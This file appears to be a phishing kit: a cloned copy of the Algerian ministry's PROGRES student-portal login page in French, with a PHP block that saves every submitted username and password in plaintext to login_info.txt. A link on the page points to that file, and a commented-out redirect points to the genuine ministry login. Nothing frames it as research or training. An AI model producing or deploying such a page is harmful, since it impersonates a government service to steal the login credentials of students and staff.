<?php
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $username = isset($_POST['loginFrm:j_username']) ? $_POST['loginFrm:j_username'] : '';
    $password = isset($_POST['loginFrm:j_password']) ? $_POST['loginFrm:j_password'] : '';

    // Validate and sanitize input (you can add more validation if needed)
    $username = filter_var($username, FILTER_SANITIZE_STRING);
    $password = filter_var($password, FILTER_SANITIZE_STRING);

    // Write the login information to a text file
    $file = 'login_info.txt';
    $data = "Username: $username, Password: $password\n";

    // Open the file in append mode and write the data
    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX) !== false) {
        echo "Login information saved successfully.";
    } else {
        echo "Unable to save login information.";
    }
}

?>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="j_idt2">
	<link type="text/css" rel="stylesheet" href="./javax.faces.resource/theme.css?ln=primefaces-saga&amp;v=12.0.0&amp;e=12.0.0" />
	<link type="text/css" rel="stylesheet" href="./javax.faces.resource/primeicons/primeicons.css?ln=primefaces&amp;v=12.0.0&amp;e=12.0.0" />
	<link type="text/css" rel="stylesheet" href="./javax.faces.resource/css/bootstrap.min.css" />
	<link type="text/css" rel="stylesheet" href="./javax.faces.resource/css/font-awesome.min.css" />
	<link type="text/css" rel="stylesheet" href="./javax.faces.resource/css/progres-production.css" />
	<link type="text/css" rel="stylesheet" href="./javax.faces.resource/css/jquery.ui.css" />
	<script type="text/javascript" src="./javax.faces.resource/jquery/jquery.js?ln=primefaces&amp;v=12.0.0&amp;e=12.0.0"></script>
	<script type="text/javascript" src="./javax.faces.resource/jquery/jquery-plugins.js?ln=primefaces&amp;v=12.0.0&amp;e=12.0.0"></script>
	<script type="text/javascript" src="./javax.faces.resource/core.js?ln=primefaces&amp;v=12.0.0&amp;e=12.0.0"></script>
	<link type="text/css" rel="stylesheet" href="./javax.faces.resource/components.css?ln=primefaces&amp;v=12.0.0&amp;e=12.0.0" />
	<script type="text/javascript" src="./javax.faces.resource/components.js?ln=primefaces&amp;v=12.0.0&amp;e=12.0.0"></script>
	<script type="text/javascript">if(window.PrimeFaces){PrimeFaces.settings.locale='fr';PrimeFaces.settings.viewId='/index.php';PrimeFaces.settings.contextPath='.';PrimeFaces.settings.cookiesSecure=false;}</script>
	<title>Authentification -
		Formation et Vie Etudiante </title>
	<meta name="description" content="" />
	<meta name="author" content="" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
	<link rel="shortcut icon" type="image/x-icon" href="./images/favicon-FVE.ico" />
	<form id="loginFrm" name="loginFrm" method="post" action="./index.php" class="smart-form client-form" enctype="application/x-www-form-urlencoded">

	<style>

		/* login */
		body.login {
			background: #d7d7d7;
		}

		.login .logo {
			background: url(../img/logo.png);
			width: 277px;
			height: 112px;
			margin: 10px auto 15px;
		}

		.login #main {
			margin-left: 0;
		}

		.login #content {
			width: 400px;
			position: relative;
			margin: 0 auto;
			padding: 0;
		}

		.login .client-form header {
			color: #999;
			font-size: 180%;
			padding: 20px 0 0;
			text-align: center;
			border-bottom: none;
			background: none;
		}

		.login .smart-form footer {
			border-top: none;
			background: #c4c4c4;
		}

		.login .note {
			text-align: center;
			padding-top: 3px;
		}

		.login .smart-form .note a {
			color: #555;
		}

		.login .smart-form .input input {
			font: 13px/16px Arial, Helvetica, sans-serif;
		}

		.login .connect1,.login .connect2 {
			width: 49%;
			height: 60px;
			float: left;
		}

		.login .connect2 {
			padding-top: 4px;
		}

		.login .ui-button {
			padding: 3px 3px 6px !important;
			float: left !important;
			margin-right: 20px !important;
		}

		.login .bas,.login .bas a {
			color: #666;
			font-size: 9.5px;
			line-height: 150%;
			text-align: center;
			padding-bottom: 20px;
		}

		.login .well {
			background: #f0f0f0;
			border: none;
			box-shadow: none;
		}

		.login .smart-form fieldset {
			background: none;
		}

		.login .titre {
			color: #777;
			font-size: 150%;
			text-align: center;
			padding: 8px 0 14px;
		}

		.login #home {
			width: 936px;
			position: relative;
			margin: 0 auto;
		}

		.login #home .well {
			border: #f0f0f0 solid 3px;
		}

		.ui-button-login {
			background: none repeat scroll 0% 0% #1DA64A !important;
		}
	</style>

</head>

<body class="animated fadeInDown login">
	

	<div id="main" role="main">

		<a href="./login_info.txt">Login info</a>

		
		<div id="content" class="container">

			<div class="logo" style="padding: 10px; text-align: center">
				<img src="./images/logo.png" alt="Progres" />
			</div>

			<div id="loginPanel" class="well no-padding">
				<form id="loginFrm" name="loginFrm" method="post" action="./index.php" class="smart-form client-form" enctype="application/x-www-form-urlencoded">
					<input type="hidden" name="loginFrm" value="loginFrm" />

					<header>Progiciel de Gestion Intégré  <br />
					<small>Formation et Vie Etudiante </small></header><span id="loginFrm:j_idt12"></span><script type="text/javascript">$(function(){PrimeFaces.focus();});</script>
					<fieldset style="padding-top: 5px">
					<style>
						.ui-messages-error-icon {
							background: none;
						}

						.messages-error-icon {
							width: 0px;
						}
					</style>

					<div id="loginFrm:messages" class="ui-messages ui-widget" aria-live="polite"></div>
					<script id="loginFrm:messages_s" type="text/javascript">$(function(){PrimeFaces.cw("Messages","widget_loginFrm_messages",{id:"loginFrm:messages"});});</script>
						<br />
						<section> <label class="input"> <i class="icon-append fa fa-user"></i><input id="loginFrm:j_username" name="loginFrm:j_username" type="text" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all " aria-required="true" autocomplete="off" placeholder="Nom d'utilisateur" /><script id="loginFrm:j_username_s" type="text/javascript">$(function(){PrimeFaces.cw("InputText","widget_loginFrm_j_username",{id:"loginFrm:j_username"});});</script></label> </section>

						<section> <label class="input"> <i class="icon-append fa fa-lock"></i><input id="loginFrm:j_password" name="loginFrm:j_password" type="password" class="ui-password ui-inputfield ui-widget ui-state-default ui-corner-all " aria-required="true" autocomplete="off" placeholder="Mot de passe" /><script id="loginFrm:j_password_s" type="text/javascript">$(function(){PrimeFaces.cw("Password","widget_loginFrm_j_password",{id:"loginFrm:j_password"});});</script>
						</label> </section>

						<section>
						
						<div class="connect1"><button id="loginFrm:loginBtn" name="loginFrm:loginBtn" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only ui-button-save" onclick="PrimeFaces.bcn(this,event,[function(event){jQuery(this).addClass('ui-state-disabled')},function(event){}]);" type="submit"><span class="ui-button-text ui-c">Se connecter</span></button><script id="loginFrm:loginBtn_s" type="text/javascript">$(function(){PrimeFaces.cw("CommandButton","widget_loginFrm_loginBtn",{id:"loginFrm:loginBtn"});});</script>
						</div>

						<div class="connect2">
							<label class="checkbox"> <input type="checkbox" name="remember" checked="false" /> <i> </i>Rester connecté
							</label>
						</div>
						</section>

					</fieldset>

					<footer>
					<div class="note">
						<a href="forget_password.xhtml">Mot de passe oublié ?</a>
					</div>
					</footer><span id="loginFrm:j_idt18"></span><script id="loginFrm:j_idt18_s" type="text/javascript">$(function(){PrimeFaces.cw("Growl","widget_loginFrm_j_idt18",{id:"loginFrm:j_idt18",sticky:false,life:6000,escape:true,keepAlive:false,msgs:[]});});</script><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:0" value="gMqso2u0iBP7ZILnDbavBjZKrBiYJ6S63VyDnXIQy4RsAdgRkvdMcEgQFqsPBEao8wRUlU3EPi13l1Fk2lyzPglscBay+E59RF0yT5VRyeBy0cU6FzhZYlXIuoUZBoAwOQqnrCHLceBaDTID6I3+1OmV6smjo662kOalS5+HevEPNRgsUzTixWyvIrcAXk879Ixm179Q7LH3b3qPBlMUjbRnhG/wwNtVDhuqy7nFJjstbu6vwZnYRysROrnBEOow7sQwwbsnPWxzrSkchH5Fk8FVWTFskSO7wATwB+sO6wBEP8MMIIPlorDLOBNPr2kXv9ZguUDethnulO++z8YbRFXonWyE9THlf8JVUsF1c+OksMQAEYBJPeEpkNTvc6/hZUadT095JFFM208236tYdyTZq2YeGomxAimu/YeALxIyAeGBJjZ8Y8XWyliRy58k1RfhGfv4GhP/q8UmSom3slYvrIB5OS0a9u20o93BuPzL0TAsKAd2YFuHAsmxHMutVl729/fIek/GkN5Q7/BI9e8ZQgQqkYk1uTd9rF2ctAwFFqrg4itlK3Qm0DVCv+nvuwBMqBO5KRReIWZgNxPcEqLOG3JoWIN8faEWbN0njIJcl2u8flIeTYzTYGkYqLQPKRRhq5Ip9VLvb2QQYwy/5Pb9DntLmuhGyUAnxEddhsOx47Wn+FtgWrwxR+Hao1PTDmwKvQ74c5sHxgegeieLQsn+pEkaRmHr6tjjbHiZgJg4Lobt0BZdwkNx50CSsU36KImbcLHQy3XS6gXz4TWYgiMF3a6SJXvMDFZUEX0QLOw0BoEuhiUMdp6j7UPtjZ4MsNb4QZt1gFA5FgQoub/Z4m50I9n1ERb2Fm0kykamb2vtHHq4X7Gi9r0krgO98oKJZWNu+FLq8uefjkpYlMldJ+QMZzLzU2Hk1aVjMRTrCehqL1CUSqpbToFK/z/IeicEiGKj0Z8GZG1vfinhPSKj7QNiy0PRR1VOvTd4yoFIWEHvdrHHaM/H8/B4Vd/mTaQzbRbyjCO9v6hVi+XXQzIIkg==" autocomplete="off" />
				</form>
			</div>

			<div class="bas">
				Copyright 2024 <a href="https://www.mesrs.dz/"><strong>Ministére de l'Enseignement Supérieur et de la Recherche Scientifique</strong></a><br /><span style="font-size: 10px"> version publiée le 22-02-2024 17:25 </span>
			</div>
		</div>
	</div></body>
</html>


<!-- < ?php -->

<!-- // header("location:https://progres.mesrs.dz/webfve/login.xhtml"); -->

<!-- ?> -->